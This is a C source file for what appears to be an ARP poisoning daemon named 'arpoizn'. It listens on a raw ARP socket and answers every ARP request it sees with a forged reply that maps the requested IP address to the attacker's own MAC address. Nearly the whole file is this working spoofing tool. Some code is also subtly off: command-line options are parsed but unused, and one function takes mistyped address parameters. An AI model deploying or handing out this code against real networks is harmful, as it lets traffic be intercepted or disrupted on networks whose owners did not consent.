#include "arpoizn.h"

int main(int argc, char* argv[])
{
	int s;
	int opt;
	int daemon = 0;
	struct ether_addr *ptr_hwa;
	struct ether_addr hwa;
	struct in_addr pro;

	while((opt=getopt(argc,argv,"dt:a:")) != -1){
		switch(opt){
			case 'd':
				daemon = 1;
				break;
			case 't':
				ptr_hwa = ether_aton(optarg);
				if(ptr_hwa == NULL){
					error(1,1,"ether_aton()");
				}
				hwa = *ptr_hwa;
				break;
			case 'a':
				if(inet_aton(optarg, &pro) == 0){
					error(1,1,"inet_aton()");
				}
				break;
		}
	}

	if((s=apz_create_socket())==-1){
		error(1,1,"apz_create_socket_ipv4()");
	}
	
	if(daemon == 1){
		if(apz_read_socket(s, apz_handle_pkg)==-1){
			error(1,1,"apz_read_socket()");
		}
	}

	shutdown(s,SHUT_RDWR);

	return 0;
}

int apz_create_socket()
{
	return socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
}

int apz_read_socket(int s, daemon_callback callback)
{
	struct sockaddr_ll addr_from;
	char pkg[ETH_DATA_LEN];
	size_t len_pkg = 0;
	socklen_t len_addr = sizeof(struct sockaddr_ll);

	do{
		memset(pkg,0,ETH_DATA_LEN);
		len_pkg = recvfrom(s,pkg,ETH_DATA_LEN,0,
				(struct sockaddr*)&addr_from,&len_addr);
		if(len_pkg == -1 || callback(s,pkg,len_pkg,&addr_from) == -1){
			return -1;
		}
	}while(len_pkg > 0);

	return 0;
}

int apz_arp_reply(
		int s, 
		int ifindex,
		struct ether_addr* ha_dst,
		struct ether_addr* ha_src,
		struct in_addr* pa_dst, 
		struct in_addr* pa_src )
{
	struct arp_pkg p;
	struct sockaddr_ll a;
	// prepare ethernet header
	memcpy(p.ether.h_source, ha_src, ETH_ALEN);
	memcpy(p.ether.h_dest, ha_dst, ETH_ALEN);
	p.ether.h_proto = htons(ETH_P_ARP);
	// prepare arp reply header
	p.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
	p.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	p.arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	p.arp.ea_hdr.ar_hln = ETH_ALEN;
	p.arp.ea_hdr.ar_pln = 4;
	// prepare arp reply package
	memcpy(p.arp.arp_sha, ha_src, ETH_ALEN);
	memcpy(p.arp.arp_tha, ha_dst, ETH_ALEN);
	memcpy(p.arp.arp_spa, pa_src, 4);
	memcpy(p.arp.arp_tpa, pa_dst, 4);
	// prepare address
	a.sll_family = PF_PACKET;
	a.sll_halen = ETH_ALEN;
	a.sll_ifindex = ifindex;
	memcpy(a.sll_addr, ha_dst, ETH_ALEN);
	
	apz_fprint_eth_hdr(stdout, &p.ether);
	apz_fprint_arp_hdr(stdout, &p.arp);

	return sendto(s,&p,sizeof(struct arp_pkg),0,(struct sockaddr*)&a,sizeof(struct sockaddr_ll));
}

int apz_handle_pkg(int s, char* pkg, int len_pkg, struct sockaddr_ll* addr)
{
	struct ethhdr* eth_hdr = (struct ethhdr*) pkg;
	struct ether_arp *arp_hdr = (struct ether_arp*) (pkg + sizeof(struct ethhdr));
	struct ether_addr sha, tha;
	struct in_addr spa, tpa;
	struct ifreq if_req;
	// print ether und arp header information
	apz_fprint_eth_hdr(stdout, eth_hdr);
	apz_fprint_arp_hdr(stdout, arp_hdr);
	// process packages by arp op type
	switch(ntohs(arp_hdr->ea_hdr.ar_op)){
		case ARPOP_REQUEST:
			if_req.ifr_ifindex = addr->sll_ifindex;
			if(ioctl(s, SIOCGIFNAME, &if_req) == -1
					|| ioctl(s, SIOCGIFHWADDR, &if_req) == -1){
				return -1;
			}
			memcpy(&tha, &arp_hdr->arp_sha, ETH_ALEN);
			memcpy(&sha, if_req.ifr_hwaddr.sa_data, ETH_ALEN);
			memcpy(&tpa, &arp_hdr->arp_spa, 4);
			memcpy(&spa, &arp_hdr->arp_tpa, 4);
			return apz_arp_reply(s, addr->sll_ifindex, &tha, &sha, &tpa, &spa);
			break;
		case ARPOP_REPLY:
			break;
		case ARPOP_RREQUEST:
			break;
		case ARPOP_RREPLY:
			break;
		case ARPOP_InREQUEST:
			break;
		case ARPOP_InREPLY:
			break;
		case ARPOP_NAK:
			break;
	};

	return 0;
}

void apz_fprint_eth_hdr(FILE* f, struct ethhdr* h)
{
	char src[20];
	char dst[20];
	strncpy(src, ether_ntoa((struct ether_addr*)&h->h_source), 20);
	strncpy(dst, ether_ntoa((struct ether_addr*)&h->h_dest), 20);
	fprintf(f, "src: %-18s dst: %-18s proto: 0x%04hX\n",
		src, dst, ntohs(h->h_proto));
}

void apz_fprint_arp_hdr(FILE* f, struct ether_arp* h)
{
	uint16_t arpop = ntohs(h->ea_hdr.ar_op);
	char ha_src[20];
	char ha_dst[20];
	char pa_src[16];
	char pa_dst[16];

	strncpy(ha_src, ether_ntoa((struct ether_addr*)&h->arp_sha),20);
	strncpy(ha_dst, ether_ntoa((struct ether_addr*)&h->arp_tha),20);
	strncpy(pa_src, inet_ntoa(*(struct in_addr*)&h->arp_spa),16);
	strncpy(pa_dst, inet_ntoa(*(struct in_addr*)&h->arp_tpa),16);
	
	fprintf(f, 
			"src: %-18s %-15s dst: %-18s %-15s op: %hu (ARPOP_%s)\n", 
			ha_src, pa_src,
			ha_dst, pa_dst,
			arpop, arp_op2str(arpop));
}

char* arp_op2str(uint16_t op)
{
	static char arp_op_str[32];
	
	switch(op){
		case ARPOP_REQUEST:
			strcpy(arp_op_str,"REQUEST");
			break;
		case ARPOP_REPLY:
			strcpy(arp_op_str,"REPLY");
			break;
		case ARPOP_RREQUEST:
			strcpy(arp_op_str,"RREQUEST");
			break;
		case ARPOP_RREPLY:
			strcpy(arp_op_str,"RREPLY");
			break;
		case ARPOP_InREQUEST:
			strcpy(arp_op_str,"InREQUEST");
			break;
		case ARPOP_InREPLY:
			strcpy(arp_op_str,"InREPLY");
			break;
		case ARPOP_NAK:
			strcpy(arp_op_str,"NAK");
			break;
		default:
			strcpy(arp_op_str,"UNKNOWN");
	}

	return arp_op_str;
}

int arp_create_ether_hdr(struct ethhdr* h, 
		const struct ether_addr* h_source, 
		const struct ether_addr* h_dest)
{
	// prepare ethernet header
	memcpy(h->h_source, h_source, ETH_ALEN);
	memcpy(h->h_dest, h_dest, ETH_ALEN);
	h->h_proto = htons(ETH_P_ARP);
	
	return 0;
}

int arp_create_hdr(struct arphdr* h, uint32_t op)
{
	// prepare ipv4 arp reply header
	h->ar_op = htons(op);
	h->ar_hrd = htons(ARPHRD_ETHER);
	h->ar_pro = htons(ETH_P_IP);
	h->ar_hln = ETH_ALEN;
	h->ar_pln = 4;
	
	return 0;
}

int arp_create_package(struct arp_pkg* p, 
		const struct ether_addr *sha, 
		const struct ether_addr *tha,
		const struct in_addr* *spa,
		const struct in_addr* *tpa
		)
{
	arp_create_ether_hdr(&p->ether, sha, tha);
	arp_create_hdr(&p->arp.ea_hdr, ARPOP_REPLY);
	// prepare arp reply package
	memcpy(p->arp.arp_sha, sha, ETH_ALEN);
	memcpy(p->arp.arp_tha, tha, ETH_ALEN);
	memcpy(p->arp.arp_spa, spa, 4);
	memcpy(p->arp.arp_tpa, tpa, 4);

	return 0;
}
